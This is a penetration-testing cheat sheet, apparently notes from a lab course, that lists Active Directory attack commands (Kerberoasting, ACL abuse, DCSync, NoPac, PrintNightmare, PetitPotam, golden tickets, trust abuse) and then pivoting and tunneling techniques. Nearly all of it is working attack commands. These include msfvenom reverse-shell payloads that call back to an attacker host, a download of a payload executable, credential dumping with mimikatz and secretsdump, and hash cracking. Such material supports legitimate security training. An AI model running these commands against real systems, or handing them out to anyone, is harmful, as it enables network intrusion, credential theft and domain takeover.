| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Attempts to crack the Kerberos (-m 13100) ticket hash (sqldev_tgs) using hashcat and a wordlist (rockyou.txt) from a Linux-based host. |
| `setspn.exe -Q */*` | Used to enumerate SPNs in a target Windows domain from a Windows-based host. |
| `Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Used to download/request all TGS tickets from a Windows-based host. |
| `mimikatz # base64 /out:true` | Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host. |
| `kerberos::list /export` | Mimikatz command used to extract the TGS tickets from a Windows-based host. |
| `echo "<base64 blob>" | tr -d \\n` | Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. |
| `cat encoded_file | base64 -d > sqldev.kirbi` | Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host. |
| `python2.7 kirbi2john.py sqldev.kirbi` | Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host. |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` | Used to modify the crack_file for Hashcat from a Linux-based host. |
| `cat sqldev_tgs_hashcat` | Used to view the prepared hash from a Linux-based host. |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt` | Used to crack the prepared Kerberos ticket hash (sqldev_tgs_hashcat) using a wordlist (rockyou.txt) from a Linux-based host. |
| `Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname` | Uses PowerView tool to extract TGS Tickets. Performed from a Windows-based host. |
| `Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat` | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host. |
| `Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Exports all TGS tickets to a .CSV file (ilfreight_tgs.csv) from a Windows-based host. |
| `cat .\ilfreight_tgs.csv` | Used to view the contents of the .csv file from a Windows-based host. |
| `.\Rubeus.exe` | Used to view the options and functionality possible with the tool Rubeus. Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /stats` | Used to check the kerberoast stats (/stats) within the target Windows domain from a Windows-based host. |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Used to request/download TGS tickets for accounts with the admin count set to 1 then formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap` | Used to request/download a TGS ticket for a specific user (/user:testspn) then formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | PowerView tool used to check the msDS-SupportedEncryptionType attribute associated with a specific user account (testspn). Performed from a Windows-based host. |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Used to attempt to crack the ticket hash using a wordlist (rockyou.txt) from a Linux-based host. |

## ACL Enumeration & Tactics

| Command | Description |
|---------|-------------|
| `Find-InterestingDomainAcl` | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. |
| `Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley` | Used to import PowerView and retrieve the SID of a specific user account (wley) from a Windows-based host. |
| `Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}` | Used to find all Windows domain objects that the user has rights over by mapping the user's SID to the SecurityIdentifier property from a Windows-based host. |
| `$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl` | Used to perform a reverse search & map to a GUID value from a Windows-based host. |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}` | Used to discover a domain object's ACL by performing a search based on GUIDs (-ResolveGUIDs) from a Windows-based host. |
| `Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt` | Used to discover a group of user accounts in a target Windows domain and add the output to a text file (ad_users.txt) from a Windows-based host. |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}` | A foreach loop used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(ad_users.txt) to the Get-ADUser cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)` | Used to create a PSCredential Object from a Windows-based host. |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` | Used to create a SecureString Object from a Windows-based host. |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` | PowerView tool used to change the password of a specific user (damundsen) on a target Windows domain from a Windows-based host. |
| `Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members` | PowerView tool used to view the members of a target security group (Help Desk Level 1) from a Windows-based host. |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to add a specific user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName` | PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` | PowerView tool used to create a fake Service Principal Name given a specific user (adunn) from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose` | PowerView tool used to remove the fake Service Principal Name created during the attack from a Windows-based host. |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to remove a specific user (damundsent) from a specific security group (Help Desk Level 1) from a Windows-based host. |
| `ConvertFrom-SddlString` | PowerShell cmdlet used to covert an SDDL string into a readable format. Performed from a Windows-based host. |

## DCSync

| Command | Description |
|---------|-------------|
| `Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol |fl` | PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host. |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool Get-ObjectAcl to check a specific user's replication rights. Performed from a Windows-based host. |
| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool used to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (172.16.5.5) and save the extracted hashes to a file (inlanefreight_hashes). Performed from a Linux-based host. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses Mimikatz to perform a dcsync attack from a Windows-based host. |

## Privileged Access

| Command | Description |
|---------|-------------|
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | PowerView based tool used to enumerate the Remote Desktop Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host. |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | PowerView based tool used to enumerate the Remote Management Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host. |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable ($password) set equal to the password (Klmcargo2) of a user from a Windows-based host. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Creates a variable ($cred) set equal to the username (forend) and password ($password) of a target domain account from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Uses the PowerShell cmdlet Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password). |
| `evil-winrm -i 10.129.201.234 -u forend` | Used to establish a PowerShell session with a Windows target from a Linux-based host using WinRM. |
| `Import-Module .\PowerUpSQL.ps1` | Used to import the PowerUpSQL tool. |
| `Get-SQLInstanceDomain` | PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | PowerUpSQL tool used to connect to a SQL server and query the version (-query 'Select @@version') from a Windows-based host. |
| `mssqlclient.py` | Impacket tool used to display the functionality and options provided with mssqlclient.py from a Linux-based host. |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` | Impacket tool used to connect to a MSSQL server from a Linux-based host. |
| `SQL> help` | Used to display mssqlclient.py options once connected to a MSSQL server. |
| `SQL> enable_xp_cmdshell` | Used to enable xp_cmdshell stored procedure that allows for executing OS commands via the database from a Linux-based host. |
| `xp_cmdshell whoami /priv` | Used to enumerate rights on a system using xp_cmdshell. |

## NoPac

| Command | Description |
|---------|-------------|
| `sudo git clone https://github.com/Ridter/noPac.git` | Used to clone a noPac exploit using git. Performed from a Linux-based host. |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Runs scanner.py to check if a target system is vulnerable to noPac/Sam_The_Admin from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Used to exploit the noPac/Sam_The_Admin vulnerability and gain a SYSTEM shell (-shell). Performed from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Used to exploit the noPac/Sam_The_Admin vulnerability and perform a DCSync attack against the built-in Administrator account on a Domain Controller from a Linux-based host. |

## PrintNightmare

| Command | Description |
|---------|-------------|
| `git clone https://github.com/cube0x0/CVE-2021-1675.git` | Used to clone a PrintNightmare exploit using git from a Linux-based host. |
| `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install` | Used to ensure the exploit author's (cube0x0) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |
| `rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'` | Used to check if a Windows target has MS-PAR & MS-RPRN exposed from a Linux-based host. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. |
| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` | Used to create an SMB server and host a shared folder (CompData) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host. |

## PetitPotam

| Command | Description |
|---------|-------------|
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Impacket tool used to create an NTLM relay by specifying the web enrollment URL for the Certificate Authority host. Performed from a Linux-based host. |
| `git clone https://github.com/topotam/PetitPotam.git` | Used to clone the PetitPotam exploit using git. Performed from a Linux-based host. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5` | Used to execute the PetitPotam exploit by specifying the IP address of the attack host (172.16.5.225) and the target Domain Controller (172.16.5.5). Performed from a Linux-based host. |
| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ -pfx-base64 <base64 certificate> = dc01.ccache` | Uses gettgtpkinit.py to request a TGT ticket for the Domain Controller (dc01.ccache) from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Impacket tool used to perform a DCSync attack and retrieve one or all of the NTLM password hashes from the target Windows domain. Performed from a Linux-based host. |
| `klist` | krb5-user command used to view the contents of the ccache file. Performed from a Linux-based host. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Used to submit TGS requests using getnthash.py from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from NTDS.dit using a DCSync attack and a captured hash (-hashes). Performed from a Linux-based host. |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a pass-the-ticket attack using the machine account (/user:ACADEMY-EA-DC01$) of a Windows target. Performed from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt` | Performs a DCSync attack using Mimikatz. Performed from a Windows-based host. |

## Miscellaneous Misconfigurations

| Command | Description |
|---------|-------------|
| `Import-Module .\SecurityAssessment.ps1` | Used to import the module SecurityAssessment.ps1. Performed from a Windows-based host. |
| `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host. |
| `adidnsdump -u inlanefreight\forend ldap://172.16.5.5` | Used to resolve all records in a DNS zone over LDAP from a Linux-based host. |
| `adidnsdump -u inlanefreight\forend ldap://172.16.5.5 -r` | Used to resolve unknown records in a DNS zone by performing an A query (-r) from a Linux-based host. |
| `Get-DomainUser * | Select-Object samaccountname,description` | PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host. |
| `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol` | PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host. |
| `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts` | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

## Group Policy Enumeration & Attacks

| Command | Description |
|---------|-------------|
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE` | Tool used to decrypt a captured group policy preference password from a Linux-based host. |
| `crackmapexec smb -L | grep gpp` | Locates and retrieves a group policy preference password using CrackMapExec, then filters the output using grep. Performed from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the SYSVOL share of a Windows target using CrackMapExec from a Linux-based host. |
| `Get-DomainGPO | select displayname` | PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. |
| `Get-GPO -All | Select DisplayName` | PowerShell cmdlet used to enumerate GPO names. Performed from a Windows-based host. |
| `$sid=Convert-NameToSid "Domain Users"` | Creates a variable called $sid that is set equal to the Convert-NameToSid tool and specifies the group account Domain Users. Performed from a Windows-based host. |
| `Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}` | PowerView tool that is used to check if the Domain Users (eq $sid) group has any rights over one or more GPOs. Performed from a Windows-based host. |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532` | PowerShell cmdlet used to display the name of a GPO given a GUID. Performed from a Windows-based host. |

## ASREPRoasting

| Command | Description |
|---------|-------------|
| `Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl` | PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host. |
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Uses Rubeus to perform an ASREP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host. |
| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt` | Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host. |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt` | Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |

## Trust Relationships - Child > Parent Trusts

| Command | Description |
|---------|-------------|
| `Import-Module activedirectory` | Used to import the Active Directory module. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *` | PowerShell cmdlet used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrust` | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrustMapping` | PowerView tool used to perform a domain trust mapping from a Windows-based host. |
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName` | PowerView tool used to enumerate users in a target child domain from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt` | Uses Mimikatz to obtain the KRBTGT account's NT Hash from a Windows-based host. |
| `Get-DomainSID` | PowerView tool used to get the SID for a target child domain from a Windows-based host. |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid` | PowerView tool used to obtain the Enterprise Admins group's SID from a Windows-based host. |
| `ls \\academy-ea-dc01.inlanefreight.local\c$` | Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. |
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses Mimikatz to create a Golden Ticket from a Windows-based host. |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` | Uses Rubeus to create a Golden Ticket from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm` | Uses Mimikatz to perform a DCSync attack from a Windows-based host. |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Impacket tool used to perform a DCSync attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240` | Impacket tool used to perform a SID Brute forcing attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"` | Impacket tool used to retrieve the SID of a target Windows domain and attach it to the Enterprise Admin group's RID from a Linux-based host. |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker` | Impacket tool used to create a Golden Ticket from a Linux-based host. |
| `export KRB5CCNAME=hacker.ccache` | Used to set the KRB5CCNAME Environment Variable from a Linux-based host. |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` | Impacket tool that automatically performs an attack that escalates from child to parent domain. |

## Trust Relationships - Cross-Forest

| Command | Description |
|---------|-------------|
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName` | PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host. |
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof` | PowerView tool used to enumerate the mssqlsvc account from a Windows-based host. |
| `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Uses Rubeus to perform a Kerberoasting Attack against a target Windows domain (/domain:FREIGHTLOGISTICS.local) from a Windows-based host. |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL` | PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | PowerShell cmdlet used to remotely connect to a target Windows system from a Windows-based host. |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` | Impacket tool used to request (-request) the TGS ticket of an account in a target Windows domain (-target-domain) from a Linux-based host. |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` | Runs the Python implementation of BloodHound against a target Windows domain from a Linux-based host. |
| `zip -r ilfreight_bh.zip *.json` | Used to compress multiple files into 1 single .zip file to be uploaded into the BloodHound GUI. |

# Pivoting, Tunneling, and Port Forwarding

| Command | Description |
|---------|-------------|
| `ifconfig` | Linux-based command that displays all current network configurations of a system. |
| `ipconfig` | Windows-based command that displays all system network configurations. |
| `netstat -r` | Command used to display the routing table for all IPv4-based protocols. |
| `nmap -sT -p22,3306 <IPaddressofTarget>` | Nmap command used to scan a target for open ports allowing SSH or MySQL connections. |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>` | SSH command used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306. |
| `netstat -antp | grep 1234` | Netstat option used to display network connections associated with a tunnel created. Using grep to filter based on local port 1234. |
| `nmap -v -sV -p1234 localhost` | Nmap command used to scan a host through a connection that has been made on local port 1234. |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>` | SSH command that instructs the SSH client to request the SSH server forward all data via port 1234 to localhost:3306. |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>` | SSH command used to perform a dynamic port forward on port 9050 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy. |
| `tail -4 /etc/proxychains.conf` | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place. |
| `proxychains nmap -v -sn 172.16.5.1-200` | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range 172.16.5.1-200 with increased verbosity (-v) disabling ping scan (-sn). |
| `proxychains nmap -v -Pn -sT 172.16.5.19` | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (-v), disabling ping discover (-Pn), and using TCP connect scan type (-sT). |
| `proxychains msfconsole` | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy. |
| `msf6 > search rdp_scanner` | Metasploit search that attempts to find a module called rdp_scanner. |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123` | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy. |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080` | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following lhost= on local port 8080 (LPORT=8080). Payload will take the form of an executable file called backupscript.exe. |
| `msf6 > use exploit/multi/handler` | Used to select the multi-handler exploit module in Metasploit. |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/` | Uses secure copy protocol (scp) to transfer the file backupscript.exe to the specified host and places it in the Ubuntu user's home directory (:~/). |
| `python3 -m http.server 8123` | Uses Python3 to start a simple HTTP server listening on port 8123. Can be used to retrieve files from a host. |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` | PowerShell command used to download a file called backupscript.exe from a webserver (172.16.5.129:8123) and then save the file to the location specified after -OutFile. |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN` | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port 8080 on the attack host to port 80 on the target. |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost> -f elf -o backupjob LPORT=8080` | Uses msfvenom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after LHOST= on port 8080 (LPORT=8080). Payload takes the form of an executable elf file called backupjob. |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23` | Metasploit command that runs a ping sweep module against the specified network segment (RHOSTS=172.16.5.0/23). |
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done` | For Loop used on a Linux-based system to discover devices in a specified network segment. |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"` | For Loop used on a Windows-based system to discover devices in a specified network segment. |
| `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment. |
| `msf6 > use auxiliary/server/socks_proxy` | Metasploit command that selects the socks_proxy auxiliary module. |
| `msf6 auxiliary(server/socks_proxy) > jobs` | Metasploit command that lists all currently running jobs. |
| `socks4 127.0.0.1 9050` | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port. |
| `Socks5 127.0.0.1 1080` | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port. |
| `msf6 > use post/multi/manage/autoroute` | Metasploit command used to select the autoroute module. |
| `meterpreter > help portfwd` | Meterpreter command used to display the features of the portfwd command. |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>` | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123` | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly. |
| `netstat -antp` | Used to display all (-a) active network connections with associated process IDs. -t displays only TCP connections. -n displays only numerical addresses. -p displays process IDs associated with each displayed connection. |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>` | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on port 8081 to the port 1234 listening on the IP address of the Attack Host. |
| `meterpreter > bg` | Meterpreter-based command used to run the selected Meterpreter session in the background. Similar to background a process in Linux. |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80` | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443` | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. |
| `plink -D 9050 ubuntu@<IPaddressofTarget>` | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |
| `sudo apt-get install sshuttle` | Uses apt-get to install the tool sshuttle. |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v` | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (172.16.5.0). |
| `sudo git clone https://github.com/klsecservices/rpivot.git` | Clones the rpivot project GitHub repository. |
| `sudo apt-get install python2.7` | Uses apt-get to install python2.7. |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Used to run the rpivot server (server.py) on proxy port 9050, server port 9999, and listening on any IP address (0.0.0.0). |
